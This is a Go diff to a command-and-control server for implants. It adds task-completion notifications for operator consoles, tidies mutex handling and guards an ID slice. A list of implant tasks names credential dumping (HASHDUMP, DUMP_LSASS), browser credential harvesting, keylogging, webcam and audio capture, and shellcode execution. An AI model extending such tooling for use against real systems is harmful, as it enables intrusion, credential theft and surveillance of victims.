@@ -299,7 +299,7 @@ func (s *C2Server) SendCommandMessage(implantID string, cmd *pb.CommandMessage) 
 }
 
 // parseAndStoreCommandResult parses beacon result payload and stores the result
-func (s *C2Server) parseAndStoreCommandResult(payload string) {
+func (s *C2Server) parseAndStoreCommandResult(payload string, implantID string) {
 	// Format: CMD_ID|SUCCESS|OUTPUT_OR_ERROR
 	parts := strings.SplitN(payload, "|", 3)
 	if len(parts) != 3 {
@@ -324,7 +324,6 @@ func (s *C2Server) parseAndStoreCommandResult(payload string) {
 	}
 
 	s.resultsMux.Lock()
-	defer s.resultsMux.Unlock()
 
 	var result *CommandResult
 	if existing, exists := s.commandResults[commandID]; exists {
@@ -353,6 +352,7 @@ func (s *C2Server) parseAndStoreCommandResult(payload string) {
 		}
 		s.commandResults[commandID] = result
 	}
+	s.resultsMux.Unlock()
 
 	// Save result to database
 	if err := s.db.SaveCommandResult(result); err != nil {
@@ -367,6 +367,9 @@ func (s *C2Server) parseAndStoreCommandResult(payload string) {
 	if err := s.db.UpdateCommandStatus(commandID, status); err != nil {
 		logrus.Errorf("Error updating command status in database: %v", err)
 	}
+
+	// Broadcast task completion notification for long-running commands
+	go s.broadcastTaskCompletion(commandID, implantID, success, output)
 }
 
 // PTY routing helpers
@@ -491,6 +494,83 @@ func (s *C2Server) broadcastSessionEvent(eventType pb.SessionEvent_SessionEventT
 		}(stream)
 	}
 
+	sessionID := session.ImplantID
+	if len(sessionID) > 8 {
+		sessionID = sessionID[:8]
+	}
 	logrus.Infof("Broadcasted session event: %s for session %s to %d console(s)",
-		eventType.String(), session.ImplantID[:8], len(activeStreams))
+		eventType.String(), sessionID, len(activeStreams))
+}
+
+// broadcastTaskCompletion broadcasts task completion notification for long-running commands
+func (s *C2Server) broadcastTaskCompletion(commandID, implantID string, success bool, output string) {
+	// Get task/command type from database to check if it's a long-running command
+	var taskType string
+
+	// First try DBTask table (for queued tasks)
+	task, err := s.db.GetTaskByID(commandID)
+	if err == nil {
+		taskType = task.Type
+	} else {
+		// Fallback to DBCommand table (for stream-sent commands)
+		cmd, err := s.db.GetCommand(commandID)
+		if err != nil {
+			logrus.Debugf("Task completion: could not find task/command %s in database", commandID)
+			return // Can't determine task type, skip notification
+		}
+		taskType = cmd.Type
+	}
+
+	// Only notify for long-running commands
+	longRunningCommands := map[string]bool{
+		"NETWORK_SCAN":         true,
+		"IFCONFIG":             true,
+		"HASHDUMP":             true,
+		"DUMP_LSASS":           true,
+		"HARVEST_CHROME":       true,
+		"HARVEST_FIREFOX":      true,
+		"HARVEST_EDGE":         true,
+		"HARVEST_ALL_BROWSERS": true,
+		"CLIPBOARD_MONITOR":    true,
+		"KEYLOG_STOP":          true,
+		"AUDIO_CAPTURE":        true,
+		"WEBCAM_CAPTURE":       true,
+		"EXECUTE_ASSEMBLY":     true,
+		"EXECUTE_SHELLCODE":    true,
+		"EXECUTE_PE":           true,
+		"EXECUTE_BOF":          true,
+	}
+
+	if !longRunningCommands[taskType] {
+		return // Skip notification for quick commands
+	}
+
+	logrus.Infof("Broadcasting task completion notification for %s (type: %s)", commandID, taskType)
+
+	// Get session info for notification
+	s.sessionsMux.RLock()
+	session, exists := s.sessions[implantID]
+	s.sessionsMux.RUnlock()
+
+	// Build clean notification message (no raw output)
+	var msg string
+	if success {
+		msg = fmt.Sprintf("%s completed (use 'results %s' to view)", taskType, commandID)
+	} else {
+		// For failures, show a brief error hint
+		errorHint := output
+		if len(errorHint) > 50 {
+			errorHint = errorHint[:50] + "..."
+		}
+		msg = fmt.Sprintf("%s failed: %s", taskType, errorHint)
+	}
+
+	// If session exists in memory, use it; otherwise create a minimal session for notification
+	if !exists {
+		session = &Session{
+			ImplantID: implantID,
+		}
+	}
+
+	s.broadcastSessionEvent(pb.SessionEvent_TASK_COMPLETED, session, msg)
 }
